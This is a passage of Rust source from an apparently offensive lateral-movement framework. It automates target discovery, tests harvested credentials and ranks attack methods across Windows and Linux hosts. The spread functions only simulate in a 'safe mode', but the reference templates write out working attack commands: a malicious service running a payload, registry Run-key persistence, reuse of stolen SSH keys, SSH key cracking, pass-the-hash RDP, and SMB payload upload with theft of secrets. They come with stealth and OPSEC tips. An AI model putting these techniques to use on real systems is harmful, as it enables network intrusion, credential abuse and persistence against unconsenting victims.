        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        for target in targets {
            if !self.can_target(target, credentials) {
                continue;
            }

            let cred = credentials.iter()
                .find(|c| c.cred_type == CredentialType::PlainText && c.password.is_some());

            if let Some(cred) = cred {
                let user = cred.username.clone().unwrap_or_else(|| "Administrator".to_string());

                let cmds = vec![
                    format!("sc \\\\{} create FeroxSvc binPath= \"C:\\payload.exe\" start= auto", target.ip_address),
                    format!("sc \\\\{} start FeroxSvc", target.ip_address),
                ];

                info!(
                    method = self.name(),
                    target = %target.display_name(),
                    mitre = self.mitre_id(),
                    "Attempting remote service creation"
                );

                if safe_mode {
                    let new_session = Session::new(
                        "lateral_movement".to_string(),
                        target.ip_address.to_string(),
                        Platform::Windows,
                    );

                    results.push(SpreadResult {
                        success: true,
                        method_name: self.name().to_string(),
                        source_session: source.id,
                        target: target.clone(),
                        new_session: Some(new_session),
                        message: format!("[SAFE MODE] Would create remote service on {} as {}", target.display_name(), user),
                        commands_executed: cmds,
                        mitre_id: self.mitre_id().to_string(),
                    });
                } else {
                    bail!("Production mode requires explicit authorization");
                }
            }
        }

        Ok(results)
    }

    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool {
        let has_smb = target.ports.contains(&445) || target.ports.is_empty();
        let has_creds = credentials.iter().any(|c| {
            (c.cred_type == CredentialType::PlainText && c.password.is_some())
                || c.cred_type == CredentialType::Hash
        });
        let is_windows = matches!(target.platform, Platform::Windows | Platform::Any);

        has_smb && has_creds && is_windows
    }

    fn success_probability(&self, target: &Target, credentials: &[HarvestedCredential]) -> f32 {
        let mut prob: f32 = 0.5;

        if target.ports.contains(&445) {
            prob += 0.15;
        }
        if credentials.iter().any(|c| c.sensitivity == Sensitivity::Critical) {
            prob += 0.15;
        }

        prob.min(0.8)
    }

    fn generate_reference(&self, target: &Target, _credential: Option<&HarvestedCredential>) -> String {
        format!(
            r#"=== Remote Service Creation ===
MITRE ATT&CK: {}
Stealth Level: {} (Easily detected)

Target: {}

TECHNIQUE:
1. Connect to Service Control Manager via SMB
2. Create new service with malicious binary
3. Start service to execute payload
4. Optionally delete service after execution

COMMANDS:
sc \\{} create FeroxSvc binPath= "C:\payload.exe" start= auto
sc \\{} start FeroxSvc
sc \\{} delete FeroxSvc

IMPACKET:
services.py DOMAIN/user:pass@{} create -name FeroxSvc -display "Ferox Service" -path "C:\payload.exe"

DETECTION:
- Event ID 7045: New service installed
- Event ID 7036: Service started/stopped
- Service executable in unusual location
- Service running as SYSTEM with network connections
"#,
            self.mitre_id(),
            self.stealth_level().as_str(),
            target.display_name(),
            target.ip_address,
            target.ip_address,
            target.ip_address,
            target.ip_address
        )
    }
}

/// Remote Registry modification
pub struct RemoteRegistryMethod;

#[async_trait]
impl LateralMovement for RemoteRegistryMethod {
    fn name(&self) -> &str {
        "remote_registry"
    }

    fn platform(&self) -> Platform {
        Platform::Windows
    }

    fn requires(&self) -> Requirements {
        Requirements::admin().with_ports(vec![445])
    }

    fn stealth_level(&self) -> StealthLevel {
        StealthLevel::Medium
    }

    fn mitre_id(&self) -> &str {
        "T1112"
    }

    fn description(&self) -> &str {
        "Modify remote registry for persistence or payload execution"
    }

    async fn spread(
        &self,
        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        for target in targets {
            if !self.can_target(target, credentials) {
                continue;
            }

            let cred = credentials.iter()
                .find(|c| c.cred_type == CredentialType::PlainText && c.password.is_some());

            if let Some(_cred) = cred {
                let cmd = format!(
                    "reg add \\\\{}\\HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Ferox /t REG_SZ /d C:\\payload.exe",
                    target.ip_address
                );

                info!(
                    method = self.name(),
                    target = %target.display_name(),
                    mitre = self.mitre_id(),
                    "Attempting remote registry modification"
                );

                if safe_mode {
                    let new_session = Session::new(
                        "lateral_movement".to_string(),
                        target.ip_address.to_string(),
                        Platform::Windows,
                    );

                    results.push(SpreadResult {
                        success: true,
                        method_name: self.name().to_string(),
                        source_session: source.id,
                        target: target.clone(),
                        new_session: Some(new_session),
                        message: format!("[SAFE MODE] Would modify registry on {}", target.display_name()),
                        commands_executed: vec![cmd],
                        mitre_id: self.mitre_id().to_string(),
                    });
                } else {
                    bail!("Production mode requires explicit authorization");
                }
            }
        }

        Ok(results)
    }

    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool {
        let has_smb = target.ports.contains(&445) || target.ports.is_empty();
        let has_creds = credentials.iter().any(|c| {
            c.cred_type == CredentialType::PlainText && c.password.is_some()
        });
        let is_windows = matches!(target.platform, Platform::Windows | Platform::Any);

        has_smb && has_creds && is_windows
    }

    fn success_probability(&self, _target: &Target, credentials: &[HarvestedCredential]) -> f32 {
        if credentials.iter().any(|c| c.sensitivity == Sensitivity::Critical) {
            0.7
        } else {
            0.5
        }
    }

    fn generate_reference(&self, target: &Target, _credential: Option<&HarvestedCredential>) -> String {
        format!(
            r#"=== Remote Registry Modification ===
MITRE ATT&CK: {}
Stealth Level: {}

Target: {}

TECHNIQUE:
1. Enable Remote Registry service (if disabled)
2. Connect to remote registry hive
3. Modify keys for persistence/execution

COMMON PERSISTENCE LOCATIONS:
- HKLM\Software\Microsoft\Windows\CurrentVersion\Run
- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

COMMANDS:
reg add \\{}\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Ferox /t REG_SZ /d C:\payload.exe

ENABLING REMOTE REGISTRY:
sc \\{} start RemoteRegistry

DETECTION:
- Remote registry connections
- Registry key modifications
- RemoteRegistry service start
"#,
            self.mitre_id(),
            self.stealth_level().as_str(),
            target.display_name(),
            target.ip_address,
            target.ip_address
        )
    }
}

// ============================================================================
// Linux Lateral Movement Methods
// ============================================================================

/// SSH Key Reuse
pub struct SshKeyReuseMethod;

#[async_trait]
impl LateralMovement for SshKeyReuseMethod {
    fn name(&self) -> &str {
        "ssh_key_reuse"
    }

    fn platform(&self) -> Platform {
        Platform::Linux
    }

    fn requires(&self) -> Requirements {
        Requirements::new().with_ssh_key().with_ports(vec![22])
    }

    fn stealth_level(&self) -> StealthLevel {
        StealthLevel::High
    }

    fn mitre_id(&self) -> &str {
        "T1021.004"
    }

    fn description(&self) -> &str {
        "Spread using harvested SSH private keys"
    }

    async fn spread(
        &self,
        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        // Find SSH key credentials
        let ssh_creds: Vec<_> = credentials.iter()
            .filter(|c| c.cred_type == CredentialType::SshKey)
            .collect();

        if ssh_creds.is_empty() {
            return Ok(results);
        }

        for target in targets {
            if !self.can_target(target, credentials) {
                continue;
            }

            let cred = ssh_creds.first().unwrap();
            let user = cred.username.clone().unwrap_or_else(|| "root".to_string());

            let cmd = format!(
                "ssh -i /path/to/stolen_key -o StrictHostKeyChecking=no {}@{}",
                user, target.ip_address
            );

            info!(
                method = self.name(),
                target = %target.display_name(),
                mitre = self.mitre_id(),
                "Attempting SSH key reuse"
            );

            if safe_mode {
                let new_session = Session::new(
                    "lateral_movement".to_string(),
                    target.ip_address.to_string(),
                    Platform::Linux,
                );

                results.push(SpreadResult {
                    success: true,
                    method_name: self.name().to_string(),
                    source_session: source.id,
                    target: target.clone(),
                    new_session: Some(new_session),
                    message: format!("[SAFE MODE] Would SSH to {} using stolen key", target.display_name()),
                    commands_executed: vec![cmd],
                    mitre_id: self.mitre_id().to_string(),
                });
            } else {
                bail!("Production mode requires explicit authorization");
            }
        }

        Ok(results)
    }

    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool {
        let has_ssh = target.ports.contains(&22) || target.ports.is_empty();
        let has_key = credentials.iter().any(|c| c.cred_type == CredentialType::SshKey);
        let is_linux = matches!(target.platform, Platform::Linux | Platform::Any);

        has_ssh && has_key && is_linux
    }

    fn success_probability(&self, target: &Target, credentials: &[HarvestedCredential]) -> f32 {
        let mut prob: f32 = 0.6;

        if target.ports.contains(&22) {
            prob += 0.1;
        }
        if credentials.iter().any(|c| {
            c.metadata.get("encrypted").map(|e| e == "false").unwrap_or(false)
        }) {
            prob += 0.2; // Unencrypted key
        }

        prob.min(0.9)
    }

    fn generate_reference(&self, target: &Target, credential: Option<&HarvestedCredential>) -> String {
        let user = credential
            .and_then(|c| c.username.clone())
            .unwrap_or_else(|| "root".to_string());

        format!(
            r#"=== SSH Key Reuse ===
MITRE ATT&CK: {}
Stealth Level: {} (Looks like normal SSH)

Target: {}
User: {}

TECHNIQUE:
1. Harvest SSH private keys from ~/.ssh/
2. Identify hosts in known_hosts or authorized_keys
3. Use stolen key to authenticate

COMMANDS:
ssh -i stolen_key -o StrictHostKeyChecking=no {}@{}

KEY LOCATIONS:
- ~/.ssh/id_rsa
- ~/.ssh/id_ed25519
- ~/.ssh/id_ecdsa

CRACKING ENCRYPTED KEYS:
ssh2john id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt

DETECTION:
- SSH authentication from unusual source
- Key-based auth without password
- New SSH sessions from compromised hosts

ADVANTAGES:
- Blends with normal SSH traffic
- No password required
- Works across network segments
"#,
            self.mitre_id(),
            self.stealth_level().as_str(),
            target.display_name(),
            user,
            user,
            target.ip_address
        )
    }
}

/// SSH Pivoting / Internal Proxy
pub struct SshPivotingMethod;

#[async_trait]
impl LateralMovement for SshPivotingMethod {
    fn name(&self) -> &str {
        "ssh_pivot"
    }

    fn platform(&self) -> Platform {
        Platform::Linux
    }

    fn requires(&self) -> Requirements {
        Requirements::new().with_ports(vec![22])
    }

    fn stealth_level(&self) -> StealthLevel {
        StealthLevel::High
    }

    fn mitre_id(&self) -> &str {
        "T1090.001"
    }

    fn description(&self) -> &str {
        "Use compromised host as SSH jump box to reach internal networks"
    }

    async fn spread(
        &self,
        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        for target in targets {
            if !self.can_target(target, credentials) {
                continue;
            }

            let cred = credentials.iter()
                .find(|c| c.cred_type == CredentialType::PlainText || c.cred_type == CredentialType::SshKey);

            if let Some(cred) = cred {
                let user = cred.username.clone().unwrap_or_else(|| "root".to_string());

                let cmd = format!(
                    "ssh -J {}@{} {}@{}",
                    source.user.clone().unwrap_or_else(|| "user".to_string()),
                    source.target,
                    user,
                    target.ip_address
                );

                info!(
                    method = self.name(),
                    target = %target.display_name(),
                    mitre = self.mitre_id(),
                    "Setting up SSH pivot"
                );

                if safe_mode {
                    let new_session = Session::new(
                        "lateral_movement".to_string(),
                        target.ip_address.to_string(),
                        Platform::Linux,
                    );

                    results.push(SpreadResult {
                        success: true,
                        method_name: self.name().to_string(),
                        source_session: source.id,
                        target: target.clone(),
                        new_session: Some(new_session),
                        message: format!("[SAFE MODE] Would pivot through {} to {}", source.target, target.display_name()),
                        commands_executed: vec![cmd],
                        mitre_id: self.mitre_id().to_string(),
                    });
                } else {
                    bail!("Production mode requires explicit authorization");
                }
            }
        }

        Ok(results)
    }

    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool {
        let has_ssh = target.ports.contains(&22) || target.ports.is_empty();
        let has_creds = !credentials.is_empty();
        let is_linux = matches!(target.platform, Platform::Linux | Platform::Any);

        has_ssh && has_creds && is_linux
    }

    fn success_probability(&self, _target: &Target, credentials: &[HarvestedCredential]) -> f32 {
        if credentials.iter().any(|c| c.cred_type == CredentialType::SshKey) {
            0.8
        } else if credentials.iter().any(|c| c.cred_type == CredentialType::PlainText) {
            0.7
        } else {
            0.4
        }
    }

    fn generate_reference(&self, target: &Target, _credential: Option<&HarvestedCredential>) -> String {
        format!(
            r#"=== SSH Pivoting ===
MITRE ATT&CK: {}
Stealth Level: {} (Encrypted tunnel)

Target: {}

TECHNIQUE:
1. Establish SSH connection to compromised host
2. Use as jump box to reach internal networks
3. Tunnel traffic through SSH

PIVOTING METHODS:
1. ProxyJump: ssh -J jumphost user@{}
2. Dynamic SOCKS: ssh -D 1080 jumphost
3. Local Forward: ssh -L 8080:{}:80 jumphost
4. Remote Forward: ssh -R 8080:localhost:80 jumphost

SSH CONFIG:
Host internal
    HostName {}
    ProxyJump jumphost
    User root

ADVANTAGES:
- All traffic encrypted
- Blends with normal SSH
- Access to internal/segmented networks
- No additional tools required
"#,
            self.mitre_id(),
            self.stealth_level().as_str(),
            target.display_name(),
            target.ip_address,
            target.ip_address,
            target.ip_address
        )
    }
}

/// Sudo Credential Reuse
pub struct SudoCredReuseMethod;

#[async_trait]
impl LateralMovement for SudoCredReuseMethod {
    fn name(&self) -> &str {
        "sudo_cred_reuse"
    }

    fn platform(&self) -> Platform {
        Platform::Linux
    }

    fn requires(&self) -> Requirements {
        Requirements::new().with_ports(vec![22])
    }

    fn stealth_level(&self) -> StealthLevel {
        StealthLevel::Medium
    }

    fn mitre_id(&self) -> &str {
        "T1548.003"
    }

    fn description(&self) -> &str {
        "Spread using harvested sudo passwords"
    }

    async fn spread(
        &self,
        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        // Find password credentials that might work for sudo
        let passwd_creds: Vec<_> = credentials.iter()
            .filter(|c| c.cred_type == CredentialType::PlainText && c.password.is_some())
            .collect();

        if passwd_creds.is_empty() {
            return Ok(results);
        }

        for target in targets {
            if !self.can_target(target, credentials) {
                continue;
            }

            let cred = passwd_creds.first().unwrap();
            let user = cred.username.clone().unwrap_or_else(|| "admin".to_string());

            let cmd = format!(
                "sshpass -p 'PASSWORD' ssh {}@{} 'echo PASSWORD | sudo -S whoami'",
                user, target.ip_address
            );

            info!(
                method = self.name(),
                target = %target.display_name(),
                mitre = self.mitre_id(),
                "Attempting sudo credential reuse"
            );

            if safe_mode {
                let new_session = Session::new(
                    "lateral_movement".to_string(),
                    target.ip_address.to_string(),
                    Platform::Linux,
                );

                results.push(SpreadResult {
                    success: true,
                    method_name: self.name().to_string(),
                    source_session: source.id,
                    target: target.clone(),
                    new_session: Some(new_session),
                    message: format!("[SAFE MODE] Would SSH+sudo to {} as {}", target.display_name(), user),
                    commands_executed: vec![cmd],
                    mitre_id: self.mitre_id().to_string(),
                });
            } else {
                bail!("Production mode requires explicit authorization");
            }
        }

        Ok(results)
    }

    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool {
        let has_ssh = target.ports.contains(&22) || target.ports.is_empty();
        let has_passwd = credentials.iter().any(|c| {
            c.cred_type == CredentialType::PlainText && c.password.is_some()
        });
        let is_linux = matches!(target.platform, Platform::Linux | Platform::Any);

        has_ssh && has_passwd && is_linux
    }

    fn success_probability(&self, _target: &Target, credentials: &[HarvestedCredential]) -> f32 {
        if credentials.iter().any(|c| c.sensitivity == Sensitivity::Critical) {
            0.7
        } else {
            0.5
        }
    }

    fn generate_reference(&self, target: &Target, credential: Option<&HarvestedCredential>) -> String {
        let user = credential
            .and_then(|c| c.username.clone())
            .unwrap_or_else(|| "admin".to_string());

        format!(
            r#"=== Sudo Credential Reuse ===
MITRE ATT&CK: {}
Stealth Level: {}

Target: {}
User: {}

TECHNIQUE:
1. Harvest user passwords (keylogger, memory dump, config files)
2. SSH to target with harvested credentials
3. Use same password for sudo elevation

COMMANDS:
sshpass -p 'password' ssh {}@{}
echo 'password' | sudo -S command

DETECTION:
- Failed sudo attempts
- SSH authentication logs
- Unusual sudo usage patterns

PASSWORD SOURCES:
- .bash_history (sudo commands may have passwords)
- Memory dumps
- Keylogger captures
- Configuration files
"#,
            self.mitre_id(),
            self.stealth_level().as_str(),
            target.display_name(),
            user,
            user,
            target.ip_address
        )
    }
}

// ============================================================================
// Cross-Platform Methods
// ============================================================================

/// RDP - Remote Desktop Protocol
pub struct RdpMethod;

#[async_trait]
impl LateralMovement for RdpMethod {
    fn name(&self) -> &str {
        "rdp"
    }

    fn platform(&self) -> Platform {
        Platform::Any
    }

    fn requires(&self) -> Requirements {
        Requirements::new().with_ports(vec![3389])
    }

    fn stealth_level(&self) -> StealthLevel {
        StealthLevel::Low
    }

    fn mitre_id(&self) -> &str {
        "T1021.001"
    }

    fn description(&self) -> &str {
        "Remote Desktop Protocol access to Windows/Linux hosts"
    }

    async fn spread(
        &self,
        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        for target in targets {
            if !self.can_target(target, credentials) {
                continue;
            }

            let cred = credentials.iter()
                .find(|c| c.cred_type == CredentialType::PlainText && c.password.is_some());

            if let Some(cred) = cred {
                let user = cred.username.clone().unwrap_or_else(|| "Administrator".to_string());
                let domain = cred.domain.clone().unwrap_or_else(|| ".".to_string());

                let cmd = format!(
                    "xfreerdp /u:{} /d:{} /p:PASSWORD /v:{}",
                    user, domain, target.ip_address
                );

                info!(
                    method = self.name(),
                    target = %target.display_name(),
                    mitre = self.mitre_id(),
                    "Attempting RDP connection"
                );

                if safe_mode {
                    let new_session = Session::new(
                        "lateral_movement".to_string(),
                        target.ip_address.to_string(),
                        target.platform.clone(),
                    );

                    results.push(SpreadResult {
                        success: true,
                        method_name: self.name().to_string(),
                        source_session: source.id,
                        target: target.clone(),
                        new_session: Some(new_session),
                        message: format!("[SAFE MODE] Would RDP to {} as {}", target.display_name(), user),
                        commands_executed: vec![cmd],
                        mitre_id: self.mitre_id().to_string(),
                    });
                } else {
                    bail!("Production mode requires explicit authorization");
                }
            }
        }

        Ok(results)
    }

    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool {
        let has_rdp = target.ports.contains(&3389) || target.services.iter().any(|s| s.contains("rdp"));
        let has_creds = credentials.iter().any(|c| {
            c.cred_type == CredentialType::PlainText && c.password.is_some()
        });

        has_rdp && has_creds
    }

    fn success_probability(&self, target: &Target, credentials: &[HarvestedCredential]) -> f32 {
        let mut prob: f32 = 0.5;

        if target.ports.contains(&3389) {
            prob += 0.2;
        }
        if credentials.iter().any(|c| c.sensitivity == Sensitivity::Critical) {
            prob += 0.15;
        }

        prob.min(0.85)
    }

    fn generate_reference(&self, target: &Target, credential: Option<&HarvestedCredential>) -> String {
        let user = credential
            .and_then(|c| c.username.clone())
            .unwrap_or_else(|| "Administrator".to_string());

        format!(
            r#"=== RDP Lateral Movement ===
MITRE ATT&CK: {}
Stealth Level: {} (Interactive session visible)

Target: {}
User: {}

TECHNIQUE:
1. Connect to RDP service (port 3389)
2. Authenticate with credentials
3. Establish interactive desktop session

TOOLS:
- xfreerdp: xfreerdp /u:{} /p:PASSWORD /v:{}
- rdesktop: rdesktop -u {} {}
- mstsc: mstsc /v:{}

PASS-THE-HASH RDP:
xfreerdp /u:{} /pth:NTLM_HASH /v:{}

RESTRICTED ADMIN MODE:
Allows PTH without password
xfreerdp /u:{} /pth:HASH /v:{} /restricted-admin

DETECTION:
- Event ID 4624 Type 10 (RemoteInteractive)
- Event ID 1149 (RDP connection)
- rdpclip.exe process
- Active RDP sessions visible to users

OPSEC:
- Consider shadowing existing sessions
- Use off-hours for stealth
- Disable NLA for PTH attacks
"#,
            self.mitre_id(),
            self.stealth_level().as_str(),
            target.display_name(),
            user,
            user,
            target.ip_address,
            user,
            target.ip_address,
            target.ip_address,
            user,
            target.ip_address,
            user,
            target.ip_address
        )
    }
}

/// SMB File Share Access
pub struct SmbMethod;

#[async_trait]
impl LateralMovement for SmbMethod {
    fn name(&self) -> &str {
        "smb"
    }

    fn platform(&self) -> Platform {
        Platform::Any
    }

    fn requires(&self) -> Requirements {
        Requirements::new().with_ports(vec![445, 139])
    }

    fn stealth_level(&self) -> StealthLevel {
        StealthLevel::Medium
    }

    fn mitre_id(&self) -> &str {
        "T1021.002"
    }

    fn description(&self) -> &str {
        "Access SMB shares and deploy payloads"
    }

    async fn spread(
        &self,
        source: &Session,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        for target in targets {
            if !self.can_target(target, credentials) {
                continue;
            }

            let cred = credentials.iter()
                .find(|c| {
                    (c.cred_type == CredentialType::PlainText && c.password.is_some())
                        || c.cred_type == CredentialType::Hash
                });

            if let Some(cred) = cred {
                let user = cred.username.clone().unwrap_or_else(|| "Administrator".to_string());
                let domain = cred.domain.clone().unwrap_or_else(|| ".".to_string());

                let cmd = format!(
                    "smbclient //{}/$ADMIN -U {}/{} -c 'put payload.exe'",
                    target.ip_address, domain, user
                );

                info!(
                    method = self.name(),
                    target = %target.display_name(),
                    mitre = self.mitre_id(),
                    "Attempting SMB access"
                );

                if safe_mode {
                    let new_session = Session::new(
                        "lateral_movement".to_string(),
                        target.ip_address.to_string(),
                        target.platform.clone(),
                    );

                    results.push(SpreadResult {
                        success: true,
                        method_name: self.name().to_string(),
                        source_session: source.id,
                        target: target.clone(),
                        new_session: Some(new_session),
                        message: format!("[SAFE MODE] Would access SMB on {} as {}", target.display_name(), user),
                        commands_executed: vec![cmd],
                        mitre_id: self.mitre_id().to_string(),
                    });
                } else {
                    bail!("Production mode requires explicit authorization");
                }
            }
        }

        Ok(results)
    }

    fn can_target(&self, target: &Target, credentials: &[HarvestedCredential]) -> bool {
        let has_smb = target.ports.contains(&445) || target.ports.contains(&139) || target.ports.is_empty();
        let has_creds = credentials.iter().any(|c| {
            (c.cred_type == CredentialType::PlainText && c.password.is_some())
                || c.cred_type == CredentialType::Hash
        });

        has_smb && has_creds
    }

    fn success_probability(&self, target: &Target, credentials: &[HarvestedCredential]) -> f32 {
        let mut prob: f32 = 0.5;

        if target.ports.contains(&445) {
            prob += 0.15;
        }
        if credentials.iter().any(|c| c.cred_type == CredentialType::Hash) {
            prob += 0.1;
        }
        if credentials.iter().any(|c| c.sensitivity == Sensitivity::Critical) {
            prob += 0.15;
        }

        prob.min(0.9)
    }

    fn generate_reference(&self, target: &Target, credential: Option<&HarvestedCredential>) -> String {
        let user = credential
            .and_then(|c| c.username.clone())
            .unwrap_or_else(|| "Administrator".to_string());

        format!(
            r#"=== SMB Lateral Movement ===
MITRE ATT&CK: {}
Stealth Level: {}

Target: {}
User: {}

TECHNIQUE:
1. Connect to SMB shares (ADMIN$, C$, IPC$)
2. Upload payload to accessible share
3. Execute via WMI, scheduled task, or service

SHARES:
- ADMIN$ (C:\Windows) - Admin required
- C$ (C:\) - Admin required
- IPC$ - For enumeration

TOOLS:
- smbclient: smbclient //{}/ADMIN$ -U DOMAIN/{}
- Impacket: smbclient.py DOMAIN/{}@{}
- CrackMapExec: crackmapexec smb {} -u {} -p PASSWORD

FILE OPERATIONS:
smbclient //{}/$SHARE -c 'put payload.exe'
smbclient //{}/$SHARE -c 'get secrets.txt'

DETECTION:
- SMB connections to admin shares
- File creation on remote systems
- Event ID 5140 (Share access)
"#,
            self.mitre_id(),
            self.stealth_level().as_str(),
            target.display_name(),
            user,
            target.ip_address,
            user,
            user,
            target.ip_address,
            target.ip_address,
            user,
            target.ip_address,
            target.ip_address
        )
    }
}

// ============================================================================
// Lateral Movement Engine
// ============================================================================

/// Main Lateral Movement Engine
pub struct LateralMovementEngine {
    methods: Vec<Box<dyn LateralMovement>>,
    spread_history: Vec<SpreadResult>,
}

impl Default for LateralMovementEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl LateralMovementEngine {
    /// Create new engine with all methods registered
    pub fn new() -> Self {
        let methods: Vec<Box<dyn LateralMovement>> = vec![
            // Windows
            Box::new(PsExecMethod),
            Box::new(WmiMethod),
            Box::new(PassTheHashMethod),
            Box::new(PassTheTicketMethod),
            Box::new(GoldenTicketMethod),
            Box::new(SilverTicketMethod),
            Box::new(RemoteServiceMethod),
            Box::new(RemoteRegistryMethod),
            // Linux
            Box::new(SshKeyReuseMethod),
            Box::new(SshPivotingMethod),
            Box::new(SudoCredReuseMethod),
            // Cross-platform
            Box::new(RdpMethod),
            Box::new(SmbMethod),
        ];

        Self {
            methods,
            spread_history: Vec::new(),
        }
    }

    /// Get methods for a specific platform
    pub fn methods_for_platform(&self, platform: &Platform) -> Vec<&dyn LateralMovement> {
        self.methods
            .iter()
            .filter(|m| {
                m.platform() == *platform
                    || m.platform() == Platform::Any
                    || *platform == Platform::Any
            })
            .map(|m| m.as_ref())
            .collect()
    }

    /// Auto-spread with harvested credentials
    pub async fn auto_spread(
        &mut self,
        source: &Session,
        credentials: &[HarvestedCredential],
        max_targets: usize,
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        // Discover targets first
        let targets = self.discover_targets_internal(source, safe_mode).await?;
        let targets: Vec<_> = targets.into_iter().take(max_targets).collect();

        if targets.is_empty() {
            info!("No targets discovered for lateral movement");
            return Ok(results);
        }

        // Try each target with multi-method approach
        for target in &targets {
            let spread_results = self
                .spread_multi_method(source, target, credentials, safe_mode)
                .await?;

            for result in spread_results {
                if result.success {
                    self.spread_history.push(result.clone());
                }
                results.push(result);
            }
        }

        Ok(results)
    }

    /// Discover reachable targets from source session
    pub async fn discover_targets(&self, source: &Session, safe_mode: bool) -> Result<DiscoveryResult> {
        self.discover_targets_full(source, safe_mode).await
    }

    async fn discover_targets_internal(
        &self,
        source: &Session,
        safe_mode: bool,
    ) -> Result<Vec<Target>> {
        let result = self.discover_targets_full(source, safe_mode).await?;
        Ok(result.targets)
    }

    async fn discover_targets_full(
        &self,
        source: &Session,
        safe_mode: bool,
    ) -> Result<DiscoveryResult> {
        info!(
            session = %source.id,
            platform = ?source.platform,
            "Discovering lateral movement targets"
        );

        if safe_mode {
            // Return demo targets
            let demo_targets = vec![
                Target::new("192.168.1.10".parse().unwrap())
                    .with_hostname("DC01")
                    .with_platform(Platform::Windows)
                    .with_ports(vec![88, 389, 445, 3389])
                    .with_domain("CORP.LOCAL")
                    .with_services(vec!["ldap", "kerberos", "smb"])
                    .mark_as_dc()
                    .with_confidence(0.95),
                Target::new("192.168.1.20".parse().unwrap())
                    .with_hostname("FILESERVER")
                    .with_platform(Platform::Windows)
                    .with_ports(vec![445, 3389])
                    .with_domain("CORP.LOCAL")
                    .with_services(vec!["smb", "rdp"])
                    .with_confidence(0.85),
                Target::new("192.168.1.30".parse().unwrap())
                    .with_hostname("WORKSTATION01")
                    .with_platform(Platform::Windows)
                    .with_ports(vec![445, 135])
                    .with_domain("CORP.LOCAL")
                    .with_confidence(0.7),
                Target::new("192.168.1.100".parse().unwrap())
                    .with_hostname("linux-web")
                    .with_platform(Platform::Linux)
                    .with_ports(vec![22, 80, 443])
                    .with_services(vec!["ssh", "http", "https"])
                    .with_confidence(0.8),
                Target::new("192.168.1.101".parse().unwrap())
                    .with_hostname("linux-db")
                    .with_platform(Platform::Linux)
                    .with_ports(vec![22, 3306])
                    .with_services(vec!["ssh", "mysql"])
                    .with_confidence(0.75),
            ];

            let domain_info = DomainInfo {
                domain_name: "CORP.LOCAL".to_string(),
                domain_controllers: vec![demo_targets[0].clone()],
                forest_name: Some("CORP.LOCAL".to_string()),
                functional_level: Some("Windows Server 2016".to_string()),
                trusts: vec!["PARTNER.LOCAL".to_string()],
            };

            return Ok(DiscoveryResult {
                targets: demo_targets,
                domain_info: Some(domain_info),
                discovery_methods: vec![
                    "ARP scan".to_string(),
                    "AD enumeration".to_string(),
                    "DNS query".to_string(),
                ],
                message: "[SAFE MODE] Discovered 5 potential targets".to_string(),
            });
        }

        bail!("Production mode discovery requires explicit authorization")
    }

    /// Test credentials against targets
    pub async fn test_credentials(
        &self,
        credentials: &[HarvestedCredential],
        targets: &[Target],
        safe_mode: bool,
    ) -> Result<CredentialMap> {
        info!(
            creds = credentials.len(),
            targets = targets.len(),
            "Testing credentials against targets"
        );

        let mut mappings = Vec::new();

        for cred in credentials {
            let mut valid_targets = Vec::new();
            let mut total_prob: f32 = 0.0;

            for target in targets {
                // Check each method for this credential/target combo
                for method in &self.methods {
                    if method.can_target(target, std::slice::from_ref(cred)) {
                        let prob = method.success_probability(target, std::slice::from_ref(cred));
                        if prob > 0.5 {
                            if !valid_targets.contains(&target.id) {
                                valid_targets.push(target.id);
                            }
                            total_prob = total_prob.max(prob);
                        }
                    }
                }
            }

            if !valid_targets.is_empty() {
                mappings.push(CredentialMapping {
                    credential: cred.clone(),
                    valid_targets,
                    success_probability: total_prob / targets.len() as f32,
                });
            }
        }

        if safe_mode {
            info!(mappings = mappings.len(), "[SAFE MODE] Credential testing complete");
        }

        Ok(CredentialMap { mappings })
    }

    /// Attempt all methods with fallback
    pub async fn spread_multi_method(
        &self,
        source: &Session,
        target: &Target,
        credentials: &[HarvestedCredential],
        safe_mode: bool,
    ) -> Result<Vec<SpreadResult>> {
        let mut results = Vec::new();

        // Sort methods by success probability for this target
        let mut ranked_methods: Vec<_> = self.methods
            .iter()
            .filter(|m| m.can_target(target, credentials))
            .map(|m| (m, m.success_probability(target, credentials)))
            .collect();

        ranked_methods.sort_by(|a, b| b.1.partial_cmp(&a.1).unwrap());

        for (method, _prob) in ranked_methods.iter().take(3) {
            let spread_results = method
                .spread(source, credentials, std::slice::from_ref(target), safe_mode)
                .await;

            match spread_results {
                Ok(mut res) => {
                    if res.iter().any(|r| r.success) {
                        results.append(&mut res);
                        break; // Success - don't try more methods
                    }
                    results.append(&mut res);
                }
                Err(e) => {
                    debug!(method = method.name(), error = %e, "Method failed");
                }
            }
        }

        Ok(results)
    }

    /// Get spread history
    pub fn spread_history(&self) -> &[SpreadResult] {
        &self.spread_history
    }

